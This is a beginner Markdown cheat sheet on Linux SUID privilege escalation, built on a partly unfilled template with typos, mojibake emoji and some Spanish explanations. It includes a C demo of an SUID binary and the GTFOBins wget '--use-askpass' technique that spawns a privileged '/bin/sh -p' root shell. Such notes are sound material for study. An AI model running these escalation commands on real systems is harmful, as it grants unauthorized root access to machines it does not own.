# [Topic Name]  
SUID Exploitation 

`‚ö†Ô∏è` **Difficulty Level**: Beginner
`üìÖ` **Last Updated**: 2025-08-17  

---

## üìå Overview  
- SUID exploitation is a technique used to gain unauthorized access to a system by exploiting a setuid (SUID) binary.  

---

## üîç Prerequisites  
**Knowledge**:  
- Basic Linux knowledge

**Tools**:  

---

## üõ†Ô∏è Methodology  
### 1. Enumeration  
- Executable files can have special permissions called SUID and GUID.
- SUID (Set User ID) and GUID (Set Group ID) are special permissions that allow a user to execute a file with the permissions of the file owner (SUID) or group (GUID).
- Binaries that have tis bit allow the binary to change user permission during its execution.

#### Security issues
- Having a binary  that runs as the owner of the file can be problematic when *the owner of said file is the root user*

We might able to:
1. Read files owned by root.
2. REad and wirute files owned by root.
3. Execute arbitrary code as the root user.
  
#### Real User ID, Effective User ID, Saved User ID
- Real User ID: Who really you are, adn therefore who owns the process.
- Effective User ID: What the operating system looks at to make authorization decision.
- Saved User ID: Used when a program running with elevated privileges needs to do some unprivileged work temporarily.

### 2. Exploitation  
**Technique 1**: SUID exploitation with `execv`  
We need to create a SUID binary and add SUID permissions to it.
```c
#include <stdio.h> // for  printf
#include <stdlib.h> // for genreal utilities
#include <unistd.h> // for getuid(), geteuid(), execv()
#include <errno.h> // for error handling

int main(int argc, char **argv) {
    // argc is the number of arguments passed to the program
    // argv is an array of strings (char pointers), each string is one argument

    uid_t uid = getuid(); // real user id
    uid_t eid = geteuid(); // effective user id

    printf("-------------------\n");
    printf("[INFO] - Real User ID: %d\n", uid);
    printf("[INFO] - Effective User ID: %d\n", eid);
    printf("-------------------\n");

    /* Execute another progrma */
    execv("/usr/bin/touch", (char*[]){"usr/bin/touch", "hello", NULL});
    
    return 0;
}
```
```bash
# Compile the binary
gcc suid_ex.c -o suid_ex

-------------------
[INFO] - Real User ID: 1000
[INFO] - Effective User ID: 1000
-------------------

# Change owner to root and add SUID permissions
sudo chown root:root suid_ex
sudo chmod u+s suid_ex

# Removde heelo file and run
-------------------
[INFO] - Real User ID: 1000
[INFO] - Effective User ID: 0
-------------------
```

## ‚ö†Ô∏è Common Vulnerabilities  
### 1. Exploting with GTFOBins
#### wget
```bash
sudo install -m =xs $(which wget) .

TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > $TF
./wget --use-askpass=$TF 0

# whoami
root
```
---

## üß∞ Tools Cheatsheet  
| Tool | Command/Usage |  
|------|--------------|  
| [LinPEAS](https://github.com/carlospolop/PEASS-ng) | `./linpeas.sh` |  
| [Metasploit](https://www.metasploit.com/) | `use exploit/linux/local/...` |  

---

## üéØ Practice Labs  
- [TryHackMe: Room Name](https://tryhackme.com)  
- [HackTheBox: Machine Name](https://hackthebox.com)  
- **Local Lab Setup**:  
  ```bash
  docker run -d --name vulnerable_app image_name
  ```  

---

## üìö References  
- [OWASP Guide](https://owasp.org)  
- [GTFOBins](https://gtfobins.github.io)  
- Book: *Title by Author*  

---

## üöÄ Quick Commands  
```bash
sudo install -m =xs $(which wget) .

-m =xs: Esta es la parte m√°s importante. La opci√≥n -m se usa para establecer los permisos del archivo.
x: Otorga permisos de ejecuci√≥n.
s: Establece el bit setuid. Este bit hace que el programa se ejecute con los permisos del due√±o del archivo, que en este caso es root (el superusuario).
```
```bash
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' > $TF 
#!/bin/sh -p: Esto se conoce como "shebang". Le dice al sistema que el archivo es un script de shell y que debe ser ejecutado por /bin/sh en modo privilegiado (-p).

/bin/sh -p 1>&0: Este comando inicia una nueva shell.
  1>: Redirige la salida est√°ndar (stdout).
  &0: La redirige a la entrada est√°ndar (stdin).
  En pocas palabras, esto crea una nueva shell y redirige sus entradas y salidas para que coincidan con las de la shell que la ejecut√≥.
```